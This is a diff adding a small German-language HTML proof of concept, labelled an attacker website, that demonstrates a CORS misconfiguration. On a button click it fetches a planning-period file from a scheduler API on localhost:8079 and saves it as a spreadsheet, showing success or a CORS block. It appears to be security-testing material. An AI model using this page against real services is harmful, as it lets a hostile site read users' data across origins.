@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <title>CORS PoC Demo</title>
+</head>
+<body>
+    <h1>CORS Demo - Angreifer Website</h1>
+    <button id="leakBtn">Scheduler API aufrufen</button>
+    <pre id="output"></pre>
+
+    <script>
+        document.getElementById('leakBtn').addEventListener('click', async () => {
+            const output = document.getElementById('output');
+            try {
+                const response = await fetch('http://localhost:8079/files/planningperiod/IRUNipC46J/download');
+                
+                if (!response.ok) throw new Error("HTTP-Fehler: " + response.status);
+                
+                const blob = await response.blob();
+
+                const downloadUrl = window.URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.href = downloadUrl;
+                
+                a.download = "Stundenplan_Export.xlsx"; 
+                
+                document.body.appendChild(a);
+                a.click();
+                a.remove();
+
+                output.innerText = "ERFOLG!\nDatei 'Stundenplan_Export.xlsx' wurde im Hintergrund heruntergeladen.";
+                output.style.color = "red";
+            } catch (err) {
+                output.innerText = "BLOCKIERT durch CORS:\n" + err.message;
+                output.style.color = "green";
+            }
+        });
+    </script>
+</body>
+</html>
